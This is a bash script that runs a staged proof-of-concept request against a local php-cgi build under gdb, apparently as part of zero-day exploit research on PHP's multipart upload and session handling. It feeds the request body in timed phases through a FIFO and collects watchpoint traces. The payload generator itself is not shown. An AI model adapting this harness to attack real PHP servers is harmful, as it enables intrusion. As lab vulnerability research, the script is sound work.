#!/bin/bash
# gdb-run of the staged poc0 shape (inert forge) on the plain php-cgi.
set -u
BASE=/tmp/opencode/realapps/side
CGI=/home/davide/ailocal/php/zerodays_1020/install_plain/bin/php-cgi
SID=poc618-gdb1
mkdir -p "$BASE/tmp" "$BASE/sess"
rm -f "$BASE/sess/sess_$SID"

# build body files (inert)
python3 "$BASE/staged_618.py" --print -o "$BASE/tmp/p618" --sid "$SID" >/dev/null || exit 1

# env for the inferior (set from shell; breakpoints-only gdb file)
export REDIRECT_STATUS=200 REQUEST_METHOD=POST
export CONTENT_TYPE='multipart/form-data; boundary=B7kQpoc618'
TOTAL=$(python3 -c "import os;print(os.path.getsize('$BASE/tmp/p618.phase1')+os.path.getsize('$BASE/tmp/p618.tail'))")
export CONTENT_LENGTH=$TOTAL
export SCRIPT_FILENAME="$BASE/empty.php"
export QUERY_STRING=''
export HTTP_COOKIE="PHPSESSID=$SID"
export GATEWAY_INTERFACE=CGI/1.1 SERVER_PROTOCOL=HTTP/1.1 SERVER_NAME=lab

# fifo + feeder in background
rm -f "$BASE/tmp/f618.fifo"
mkfifo "$BASE/tmp/f618.fifo"
python3 "$BASE/feeder_f618.py" "$BASE/tmp/p618.phase1" "$BASE/tmp/p618.tail" 1.35 \
  > "$BASE/tmp/f618.fifo" &
FEEDER=$!

gdb -q -batch -x "$BASE/g618.gdb" --args "$CGI" \
  -d cgi.force_redirect=0 -d "session.save_path=$BASE/sess" \
  > "$BASE/p618_gdb.out" 2>&1
RC=$?
wait $FEEDER 2>/dev/null

echo "gdb-exit=$RC"
echo "sessfile=$(stat -c%s "$BASE/sess/sess_$SID" 2>/dev/null || echo NONE)"
echo "--- trace (EVT/WATCH lines) ---"
grep -E '^(EVT|WATCH)' "$BASE/p618_trace.log" | head -80
echo "--- watch fire count ---"
grep -c '^WATCH' "$BASE/p618_trace.log"
